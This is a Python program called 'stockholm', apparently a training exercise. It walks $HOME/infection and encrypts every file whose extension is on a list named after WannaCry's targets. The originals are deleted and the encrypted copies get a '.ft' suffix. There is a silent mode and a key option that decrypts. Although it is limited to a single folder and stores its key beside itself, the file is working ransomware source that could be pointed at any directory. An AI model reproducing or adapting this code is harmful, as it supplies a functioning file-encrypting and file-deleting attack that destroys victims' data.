#! /usr/bin/python3

import argparse
import os, sys
from os.path import isdir
from cryptography.fernet import Fernet
from pathlib import Path

INFECT_FOLDER_NAME = "infection"
ENCRYPTED_EXT = ".ft"

STOCKHOLM_LOCATION = Path(__file__).resolve().parent
# BASE_INFECT_FOLDER = f"{STOCKHOLM_LOCATION}/{INFECT_FOLDER_NAME}" # REMOVE FOR FINAL VERSION
BASE_INFECT_FOLDER = f"{Path.home()}/{INFECT_FOLDER_NAME}" # ENABLE FOR FINAL VERSION


def parser():
    parser = argparse.ArgumentParser(
        prog='stockholm',
        description='Encrypt all files in $HOME/infection'
    )
    parser.add_argument(
        '-v', '--version',
        default=False, action='store_true',
        help="shows program version.",
    )
    parser.add_argument(
        '-r', '--reverse',
        metavar='KEY', dest='key',
        type=str,
        help="key used to decrypt files."
    )
    parser.add_argument(
        '-s', '--silent',
        default=False, action='store_true',
        help="hide program output.",
    )
    return parser.parse_args()


args = parser()

SILENT_MODE = args.silent
DECRYPT_KEY = args.key
SHOWS_VERSION = args.version


if SHOWS_VERSION:
    print("stockholm v1.0")
    exit(0)

if SILENT_MODE == True:
    file_devnull = open(os.devnull, 'w')
    sys.stdout = file_devnull


def backup_key():
    try:
        with open(f"{STOCKHOLM_LOCATION}/stockholm.key", 'wb') as backup_key:
            backup_key.write(DECRYPT_KEY)
    except Exception as e:
        print(f"Error: {e}")
        exit(1)


if not DECRYPT_KEY:
    DECRYPT_KEY = Fernet.generate_key()
    backup_key()


try:
    FERNET = Fernet(DECRYPT_KEY)
except Exception as e:
    print(f"Error: {e}")
    exit(1)


WANNACRY_TARGETS = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2",
    ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc",
    ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",
    ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd",
    ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp",
    ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob",
    ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u",
    ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png",
    ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar",
    ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx",
    ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf",
    ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam",
    ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
    ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc",
]

def encrypt_file(file_path:str):
    extension = Path(file_path).suffix
    if extension not in WANNACRY_TARGETS:
        return
    try:
        with open(file_path, 'rb') as file_read:
            raw_data = file_read.read()
        with open(file_path+ENCRYPTED_EXT, 'wb') as file_write:
            file_write.write(FERNET.encrypt(raw_data))
        print(f"Encrypted -> {file_path}")
        os.remove(file_path)
    except Exception as e:
        print(f"Error: {e}")
        exit(1)

def encrypt_folder(folder_name:str=BASE_INFECT_FOLDER):
    files = os.listdir(folder_name)
    for file in files:
        file_path = folder_name + "/" + file
        if isdir(file_path):
            encrypt_folder(file_path)
        else:
            encrypt_file(file_path)


def decrypt_file(file_path:str):
    extension = Path(file_path).suffix
    try:
        if extension == ENCRYPTED_EXT:
            with open(file_path, 'rb') as file_read:
                raw_data = file_read.read()
            with open(file_path.removesuffix(ENCRYPTED_EXT), 'wb') as file_write:
                file_write.write(FERNET.decrypt(raw_data))
            print(f"Decrypted -> {file_path}")
            os.remove(file_path)
    except Exception as e:
        print(f"Error: {e}")


def decrypt_folder(folder_name:str=BASE_INFECT_FOLDER):
    files = os.listdir(folder_name)
    for file in files:
        file_path = folder_name + "/" + file
        if isdir(file_path):
            decrypt_folder(file_path)
        else:
            decrypt_file(file_path)


if __name__ == '__main__':
    if args.key:
        decrypt_folder()
    else:
        encrypt_folder()
